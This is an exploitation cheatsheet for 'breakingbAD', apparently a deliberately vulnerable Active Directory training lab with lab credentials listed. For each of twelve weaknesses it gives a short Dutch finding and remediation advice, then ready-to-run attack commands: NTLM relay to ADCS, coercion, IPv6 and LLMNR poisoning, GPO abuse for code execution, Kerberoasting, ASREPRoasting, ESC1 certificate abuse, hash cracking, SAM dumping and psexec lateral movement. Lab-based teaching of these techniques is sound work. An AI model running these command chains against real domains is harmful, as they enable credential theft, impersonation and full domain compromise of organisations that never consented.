# breakingbAD Exploitation Cheatsheet

Quick reference for exploiting all 12 vulnerabilities in the lab.

**Domain:** `breakingbad.local` | **DC:** `192.168.100.10` | **srv01:** `192.168.100.20` | **srv02:** `192.168.100.21`
**Domain Admin:** `Administrator` / `452dvcZ!`

| User | Password | Group |
|------|----------|-------|
| walter.white | 774azeG! | Methcooks |
| jessie.pinkman | 313lksV! | Methcooks |
| saul.goodman | 657crsH! | Lawyers |
| gustavo.fring | 659ldoK! | Distributors |
| hector.salamanca | 346modL! | Distributors |

---

## Quick Verification (Demo Setup)

Run these to verify the lab is ready:

```bash
# Add domain to /etc/hosts (required for Kerberos)
echo "192.168.100.10 dc01.breakingbad.local breakingbad.local DC01" | sudo tee -a /etc/hosts

# Verify connectivity to all machines
nxc smb 192.168.100.10 192.168.100.20 192.168.100.21 -u Vagrant -p vagrant

# Check ADCS web enrollment - HTTP (vuln 01 ESC8)
curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: OK (HTTP auth required)"

# Check WebClient on srv02 (vuln 03)
nxc smb 192.168.100.21 -u Vagrant -p vagrant -M webdav

# Check password in description (vuln 07)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant -M get-desc-users

# Check Kerberoastable users (vuln 08)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant --kerberoasting /tmp/kerb.txt && cat /tmp/kerb.txt

# Check ASREProastable users (vuln 09)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant --asreproast /tmp/asrep.txt && cat /tmp/asrep.txt

# Check vulnerable ADCS templates (vuln 10 ESC1)
certipy find -u Vagrant@breakingbad.local -p vagrant -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "ESC1|ESC8"

# Check shared local admin (vuln 12)
nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
```

---

## 01 - ESC8 (ADCS Web Enrollment)

**Target:** dc01 (CA) + srv02 (coerce target) | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any machine account.

> **Bevinding:** De Active Directory Certificate Services (ADCS) web enrollment is bereikbaar over onversleuteld HTTP. Een aanvaller kan een machine dwingen om te authenticeren (coercion) en deze authenticatie doorsturen (relay) naar het ADCS-enrollment endpoint. Hiermee wordt een certificaat aangevraagd op naam van het machine-account. Met dit certificaat kan de aanvaller zich voordoen als de machine en verder het domein compromitteren. **Aanbeveling:** Schakel HTTP uit op het enrollment endpoint en forceer HTTPS, of verwijder de web enrollment rol indien niet nodig.

```bash
# Check if web enrollment is available (HTTP, not HTTPS!)
curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: HTTP auth required (vulnerable)"

# Terminal 1: Start ntlmrelayx targeting ADCS web enrollment
ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Terminal 2: Coerce srv02 to authenticate to your relay (use your Kali IP)
coercer coerce -d breakingbad.local -u walter.white -p "774azeG!" -t 192.168.100.21 -l <KALI_IP> --always-continue

# After relay succeeds, you get SRV02$.pfx - authenticate with it
certipy auth -pfx SRV02\$.pfx -dc-ip 192.168.100.10

# Use the machine hash for Silver Ticket or S4U2Self attacks
# Or with the ccache for Kerberos auth:
export KRB5CCNAME=srv02.ccache
nxc smb 192.168.100.21 -k --use-kcache
```

---

## 02 - NTLMv1

**Target:** srv01 | **What:** srv01 accepts NTLMv1 authentication (LmCompatibilityLevel=2). Captured NTLMv1 hashes can be cracked or relayed trivially.

> **Bevinding:** Op srv01 staat het LmCompatibilityLevel op 2, waardoor NTLMv1-authenticatie wordt geaccepteerd. NTLMv1 is een verouderd en cryptografisch zwak protocol — onderschepte hashes kunnen binnen seconden worden gekraakt of via een rainbow table worden omgezet naar het NTLM-wachtwoord. Dit geeft een aanvaller directe toegang tot het account. **Aanbeveling:** Stel LmCompatibilityLevel in op 5 (alleen NTLMv2) op alle systemen, bij voorkeur via Group Policy.

```bash
# Coerce srv01 to authenticate to your listener (e.g. via PetitPotam, PrinterBug)
responder -I eth0 -v --lm

# Capture NTLMv1 hashes (copy to demo/hashes)
cp /usr/share/responder/logs/*NTLMv1* ~/breakingbAD/demo/hashes/ntlmv1.txt

# Crack NTLMv1 hashes (mode 5500)
hashcat -m 5500 ~/breakingbAD/demo/hashes/ntlmv1.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh ntlmv1

# NTLMv1 with ESS can also be submitted to https://crack.sh for free cracking
```

---

## 03 - WebClient (WebDAV Coercion)

**Target:** srv02 | **What:** WebClient service is running, enabling HTTP-based NTLM coercion (no SMB signing required over HTTP).

> **Bevinding:** Op srv02 is de WebClient-service actief. Dit maakt het mogelijk om NTLM-authenticatie af te dwingen via HTTP (WebDAV) in plaats van SMB. Het grote risico is dat SMB signing niet van toepassing is op HTTP-verkeer, waardoor relay-aanvallen mogelijk worden die anders geblokkeerd zouden zijn. Een aanvaller kan hiermee authenticatie doorsturen naar bijvoorbeeld LDAP of ADCS. **Aanbeveling:** Schakel de WebClient-service uit op servers waar deze niet nodig is (`Set-Service WebClient -StartupType Disabled`).

```bash
# Verify WebClient is running
nxc smb 192.168.100.21 -u walter.white -p "774azeG!" -M webdav

# Coerce authentication via WebDAV (PetitPotam over HTTP)
PetitPotam.py -u walter.white -p "774azeG!" -d breakingbad.local attacker@80/test 192.168.100.21

# Combine with ntlmrelayx for relay attacks
ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
```

---

## 04 - GPO Abuse

**Target:** dc01 / GPO "Los Pollos Hermanos" | **What:** Authenticated Users have full edit rights on the GPO linked to OU=Cartel. Any domain user can inject a scheduled task for RCE.

> **Bevinding:** De Group Policy Object "Los Pollos Hermanos" heeft onjuiste permissies: de groep Authenticated Users heeft volledige schrijfrechten (WriteDACL, WriteOwner, WriteProperties). Hierdoor kan iedere geauthenticeerde domeingebruiker de GPO aanpassen, bijvoorbeeld door een scheduled task toe te voegen die code uitvoert op alle machines waar de GPO op van toepassing is. Dit leidt direct tot Remote Code Execution. **Aanbeveling:** Beperk schrijfrechten op GPO's tot alleen beheerders. Controleer regelmatig GPO-permissies met tools als BloodHound of bloodyAD.

```bash
# Enumerate writable GPOs with bloodyAD
bloodyAD -u walter.white -p "774azeG!" -d breakingbad.local --host 192.168.100.10 get writable --otype GPO --right WRITE

# Or check GPO DACL with nxc daclread
nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" -M daclread \
  -o TARGET_DN="CN={B3FBBE10-7816-4754-AFBC-B82D41A050F2},CN=Policies,CN=System,DC=breakingbad,DC=local" ACTION=read

# Check with BloodHound
bloodhound-python -u walter.white -p "774azeG!" -d breakingbad.local -dc dc01.breakingbad.local -c all

# Abuse with pyGPOAbuse (add local admin or reverse shell)
pygpoabuse.py breakingbad.local/walter.white:"774azeG!" \
  -gpo-id "B3FBBE10-7816-4754-AFBC-B82D41A050F2" \
  -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f

# Or use SharpGPOAbuse from Windows
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"

# Force gpupdate on target (or wait)
nxc smb 192.168.100.20 -u walter.white -p "774azeG!" -x 'gpupdate /force'
```

---

## 05 - IPv6 Poisoning

**Target:** srv02 | **What:** IPv6 is enabled; an attacker can run a rogue DHCPv6 server to MITM traffic and relay credentials.

> **Bevinding:** Op srv02 is IPv6 ingeschakeld, terwijl er geen legitieme DHCPv6-server in het netwerk aanwezig is. Een aanvaller kan met een tool als mitm6 een malafide DHCPv6-server opzetten en zichzelf als DNS-server presenteren. Hierdoor wordt al het DNS-verkeer van het slachtoffer via de aanvaller geleid, wat leidt tot het onderscheppen van NTLM-authenticatie. Deze authenticatie kan vervolgens worden doorgestuurd naar de Domain Controller om bijvoorbeeld een nieuw machine-account aan te maken met delegatierechten. **Aanbeveling:** Schakel IPv6 uit via Group Policy als het niet in gebruik is, of implementeer DHCPv6 Guard op netwerkniveau.

```bash
# Terminal 1: Run mitm6 to become the IPv6 DNS server
mitm6 -d breakingbad.local -i eth0

# Terminal 2: Relay captured auth to LDAPS on DC (creates a machine account for RBCD)
ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot --delegate-access

# Terminal 3: Trigger DHCPv6 by rebooting srv02
./lab.sh vuln trigger 5

# mitm6 poisons DNS -> srv02 authenticates to us -> ntlmrelayx relays to LDAPS
# ntlmrelayx creates a machine account (e.g. YOURMACHINE$) with RBCD rights on srv02

# Use the created machine account for S4U2Proxy to impersonate admin on srv02
getST.py breakingbad.local/'YOURMACHINE$':'PASSWORD' -spn cifs/srv02.breakingbad.local \
  -impersonate Administrator -dc-ip 192.168.100.10

# Use the ticket
export KRB5CCNAME=Administrator@cifs_srv02.breakingbad.local@BREAKINGBAD.LOCAL.ccache
nxc smb srv02.breakingbad.local -k --use-kcache -x 'whoami'

# Alternative: relay to LDAPS without --delegate-access to dump domain info
ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot
# Check loot/ directory for dumped users, groups, computers, and domain info
ls loot/
```

---

## 06 - LLMNR / NBT-NS / mDNS Poisoning

**Target:** srv02 | **What:** Name resolution fallback protocols are enabled. Respond to broadcast queries to capture NTLMv2 hashes.

> **Bevinding:** Op srv02 zijn de fallback-protocollen LLMNR, NBT-NS en mDNS actief. Wanneer een DNS-lookup mislukt, stuurt Windows een broadcast naar het lokale netwerk via deze protocollen. Een aanvaller kan hierop reageren en zich voordoen als de gevraagde host. Het slachtoffer stuurt vervolgens zijn NTLM-hash naar de aanvaller. Deze hash kan offline worden gekraakt of direct worden doorgestuurd (relay) naar andere diensten. **Aanbeveling:** Schakel LLMNR uit via Group Policy en NBT-NS via de netwerkconfiguratie. Overweeg daarnaast mDNS uit te schakelen via de Windows Firewall.

```bash
# Trigger: walter.white searches for a non-existent share
./lab.sh vuln trigger 6

# Capture hashes with Responder (output to demo/hashes for cracking)
responder -I eth0 -dwv -O ~/breakingbAD/demo/hashes

# Copy captured hashes for cracking
cp /usr/share/responder/logs/*NTLMv2* ~/breakingbAD/demo/hashes/ntlmv2.txt

# Crack captured NTLMv2 hashes (mode 5600)
hashcat -m 5600 ~/breakingbAD/demo/hashes/ntlmv2.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh ntlmv2

# Or relay instead of cracking
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 07 - Password in User Description

**Target:** dc01 / saul.goodman | **What:** saul.goodman's password is stored in his AD description field. Any authenticated user can read it.

> **Bevinding:** Het wachtwoord van het account saul.goodman staat in het description-veld van het Active Directory-object. Dit veld is standaard leesbaar voor alle geauthenticeerde gebruikers. In de praktijk wordt dit vaak gedaan door beheerders als "geheugensteuntje", maar het betekent dat elke domeingebruiker het wachtwoord kan uitlezen met een simpele LDAP-query. **Aanbeveling:** Sla nooit wachtwoorden op in AD-attributen die leesbaar zijn voor andere gebruikers. Gebruik een wachtwoordmanager en controleer periodiek op wachtwoorden in description-velden.

```bash
# Query with netexec
nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" -M get-desc-users

# Query with ldapsearch
ldapsearch -x -H ldap://192.168.100.10 -D "walter.white@breakingbad.local" -w "774azeG!" \
  -b "OU=Cartel,DC=breakingbad,DC=local" "(sAMAccountName=saul.goodman)" description

# Or with rpcclient
rpcclient -U "walter.white%774azeG!" 192.168.100.10 -c 'queryuser saul.goodman'

# Verify the password works
nxc smb 192.168.100.10 -u saul.goodman -p "657crsH!"
```

---

## 08 - Kerberoasting

**Target:** dc01 / hector.salamanca (SPN: HTTP/srv01) | **What:** hector.salamanca has an SPN assigned and is local admin on srv01. Request a TGS ticket, crack it offline, and use it for lateral movement.

> **Bevinding:** Het account hector.salamanca heeft een Service Principal Name (SPN) gekoppeld. Hierdoor kan iedere geauthenticeerde domeingebruiker een Kerberos TGS-ticket opvragen voor dit account. Dit ticket is versleuteld met het wachtwoord van het service-account en kan offline worden gekraakt zonder dat dit detecteerbaar is op het netwerk. Bij een zwak wachtwoord levert dit directe toegang op tot het account. **Aanbeveling:** Gebruik lange, complexe wachtwoorden (25+ tekens) voor accounts met SPN's. Overweeg Group Managed Service Accounts (gMSA) te gebruiken, waarbij wachtwoorden automatisch worden geroteerd.

```bash
# Find kerberoastable users (output to demo/hashes)
nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt

# Or with impacket
GetUserSPNs.py breakingbad.local/walter.white:"774azeG!" -dc-ip 192.168.100.10 -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt

# Crack the TGS hash (mode 13100)
hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh kerberoast

# Verify cracked password
nxc smb 192.168.100.10 -u hector.salamanca -p "346modL!"
```

---

## 09 - ASREPRoasting

**Target:** dc01 / jessie.pinkman | **What:** jessie.pinkman has Kerberos pre-auth disabled. Request an AS-REP without knowing the password and crack it offline.

> **Bevinding:** Voor het account jessie.pinkman is Kerberos pre-authenticatie uitgeschakeld ("Do not require Kerberos preauthentication"). Hierdoor kan een aanvaller — zonder enige inloggegevens — een AS-REP-bericht opvragen bij de Domain Controller. Dit bericht bevat data versleuteld met het wachtwoord van het account, dat offline kan worden gekraakt. In tegenstelling tot Kerberoasting is hier niet eens een domeinaccount voor nodig. **Aanbeveling:** Schakel Kerberos pre-authenticatie in voor alle accounts. Controleer dit periodiek met een LDAP-query op de UserAccountControl flag DONT_REQ_PREAUTH.

```bash
# Find users without pre-auth (output to demo/hashes)
nxc ldap 192.168.100.10 -u walter.white -p "774azeG!" --asreproast ~/breakingbAD/demo/hashes/asreproast.txt

# Or with impacket (no creds needed if you know the username)
GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat -outputfile ~/breakingbAD/demo/hashes/asreproast.txt

# Or enumerate all vulnerable users
GetNPUsers.py breakingbad.local/ -dc-ip 192.168.100.10 -usersfile users.txt -no-pass

# Crack the AS-REP hash (mode 18200)
hashcat -m 18200 ~/breakingbAD/demo/hashes/asreproast.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh asreproast

# Verify cracked password
nxc smb 192.168.100.10 -u jessie.pinkman -p "313lksV!"
```

---

## 10 - ESC1 (Certificate Template Abuse)

**Target:** dc01 | **What:** Vulnerable certificate template allows specifying a Subject Alternative Name (SAN). Request a cert as any user including Domain Admin.

> **Bevinding:** Er is een kwetsbaar certificaattemplate (ESC1) geconfigureerd waarmee de aanvrager zelf de Subject Alternative Name (SAN) mag opgeven. In combinatie met het feit dat Domain Users het template mogen gebruiken, kan iedere domeingebruiker een certificaat aanvragen op naam van een willekeurig ander account — inclusief de Domain Admin. Met dit certificaat kan vervolgens een Kerberos TGT worden aangevraagd en de NTLM-hash van het doelaccount worden achterhaald. **Aanbeveling:** Verwijder de optie "Supply in the request" uit certificaattemplates, of beperk enrollment-rechten tot specifieke beveiligde groepen. Audit templates regelmatig met certipy of Certify.

```bash
# Find vulnerable templates
certipy find -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 -vulnerable -stdout

# Request a certificate as Administrator using the ESC1 template (via DCOM)
certipy req -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 \
  -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
  -upn administrator@breakingbad.local -dcom

# Or via web enrollment (HTTP)
certipy req -u walter.white@breakingbad.local -p "774azeG!" -dc-ip 192.168.100.10 \
  -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
  -upn administrator@breakingbad.local -web -http-scheme http -no-channel-binding

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10

# Use the NT hash to access the DC
nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
```

---

## 11 - Anonymous Logon (Pre-Windows 2000)

**Target:** dc01 | **What:** Anonymous Logon is in the Pre-Windows 2000 Compatible Access group. Unauthenticated LDAP enumeration is possible.

> **Bevinding:** De groep "Pre-Windows 2000 Compatible Access" bevat het Anonymous Logon-account. Hierdoor kan een ongeauthenticeerde aanvaller via LDAP en RPC het volledige Active Directory uitlezen: gebruikersnamen, groepslidmaatschappen, beschrijvingsvelden en meer. Dit biedt een aanvaller een compleet overzicht van de domeinstructuur zonder dat er inloggegevens nodig zijn, en maakt gerichte vervolgaanvallen zoals password spraying of ASREPRoasting mogelijk. **Aanbeveling:** Verwijder Anonymous Logon en Everyone uit de groep "Pre-Windows 2000 Compatible Access". Test na wijziging of er geen legacy-applicaties breken.

```bash
# Enumerate users without credentials
nxc ldap 192.168.100.10 -u '' -p '' --users

# Enumerate with ldapsearch (anonymous bind)
ldapsearch -x -H ldap://192.168.100.10 -b 'DC=breakingbad,DC=local' '(objectClass=user)' sAMAccountName description

# Enumerate with rpcclient
rpcclient -U '' -N 192.168.100.10 -c 'enumdomusers'

# Enumerate with enum4linux-ng
enum4linux-ng -A 192.168.100.10
```

---

## 12 - Shared Local Admin Password

**Target:** srv01 + srv02 | **Creds:** `svc_admin` / `Zomer123!` | **What:** Same local admin account on both servers. Compromise one, move laterally to the other.

> **Bevinding:** Op zowel srv01 als srv02 bestaat een lokaal beheerdersaccount (svc_admin) met hetzelfde wachtwoord. Wanneer een aanvaller via een andere kwetsbaarheid toegang krijgt tot één server, kan ditzelfde wachtwoord direct worden hergebruikt om lateraal naar de andere server te bewegen. Dit is een veelvoorkomend probleem in omgevingen waar lokale admin-accounts handmatig worden beheerd. **Aanbeveling:** Implementeer LAPS (Local Administrator Password Solution) zodat elk systeem een uniek, automatisch geroteerd wachtwoord krijgt voor het lokale beheerdersaccount.

```bash
# Verify creds work on both servers
nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth

# Dump SAM on srv01
nxc smb 192.168.100.20 -u svc_admin -p "Zomer123!" --local-auth --sam

# Use same creds to move to srv02
nxc smb 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth -x 'whoami'

# Or get a shell with psexec
psexec.py svc_admin:"Zomer123!"@192.168.100.20
psexec.py svc_admin:"Zomer123!"@192.168.100.21
```

---

## Attack Chains

Zie [ATTACK_CHAINS.md](ATTACK_CHAINS.md) voor uitgewerkte demo-scenario's met stap-voor-stap commando's.
